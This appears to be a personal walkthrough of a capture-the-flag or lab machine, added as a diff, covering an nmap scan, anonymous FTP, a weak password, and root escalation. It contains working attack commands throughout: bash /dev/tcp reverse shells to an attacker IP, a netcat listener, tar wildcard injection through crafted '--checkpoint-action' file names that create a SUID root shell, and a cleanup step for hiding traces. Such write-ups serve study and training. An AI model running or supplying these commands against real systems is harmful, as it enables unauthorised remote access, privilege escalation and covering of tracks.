@@ -1,0 +1,91 @@
+
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.5
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.45.201
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
+22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0e:ad:d7:de:60:2b:49:ef:42:3b:1e:76:9c:77:33:85 (ECDSA)
+|_  256 99:b5:48:fb:77:df:18:b0:1d:ad:e0:92:f3:e1:26:0d (ED25519)
+80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+20000/tcp open  http    MiniServ 1.820 (Webmin httpd)
+|_http-server-header: MiniServ/1.820
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: 7533509A5A4350D01C0CD6461F8CA7F3
+|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+anonymous login to ftp
+download pdf file in backup folder
+exiftool -a *.pdf
+to extract metadata from these files.
+found user Mark Cassie Robert
+weak passwork cassie:cassie
+
+Navigate to Usermin->Login->Command Shell  run:
+/bin/sh -i >& /dev/tcp/192.168.45.201/443 0>&1
+
+─$ nc -nlvp 443
+listening on [any] 443 ...
+connect to [192.168.45.201] from (UNKNOWN) [192.168.242.157] 50678
+sh: cannot set terminal process group (2121): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-5.1$ id
+id
+uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)
+
+upload and run pspy. found:
+
+2026/04/27 11:00:01 CMD: UID=0     PID=2216   | /bin/bash -c cd /opt/admin && tar -zxf /tmp/backup.tar.gz * 
+2026/04/27 11:00:01 CMD: UID=0     PID=2217   | tar -zxf /tmp/backup.tar.gz * 
+
+It means every time it run tar command to /opt/admin
+ls -la /opt/admin confirm have write permission
+
+echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /opt/admin/exploit.sh
+chmod +x /opt/admin/exploit.sh
+touch /opt/admin/--checkpoint=1
+touch /opt/admin/--checkpoint-action=exec="sh exploit.sh"
+
+Then run /tmp/rootbash -p to get a root shell.
+sh-5.1$ /tmp/rootbash -p
+/tmp/rootbash -p
+id
+uid=1000(cassie) gid=1000(cassie) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),1000(cassie)
+
+######################################################################################################
+Key learning
+exiftool -a *.pdf can use to extract file metadata.
+with username try weak password if no other clue.
+
+understand what pspy output means.
+for tar it take --checkpoint=1 file name as argument. so execute the action.
+
+Below is more direct way to get a reverse root shell
+echo "#!/bin/bash" > /opt/admin/exploit.sh
+echo "bash -i >& /dev/tcp/192.168.45.201/4444 0>&1" >> /opt/admin/exploit.sh
+chmod +x /opt/admin/exploit.sh
+touch /opt/admin/--checkpoint=1
+touch /opt/admin/--checkpoint-action=exec="sh exploit.sh"
+
+# Once you are root
+rm /opt/admin/--checkpoint=1 /opt/admin/--checkpoint-action=exec="sh exploit.sh" /opt/admin/exploit.sh
+this also can reduce noisy. 
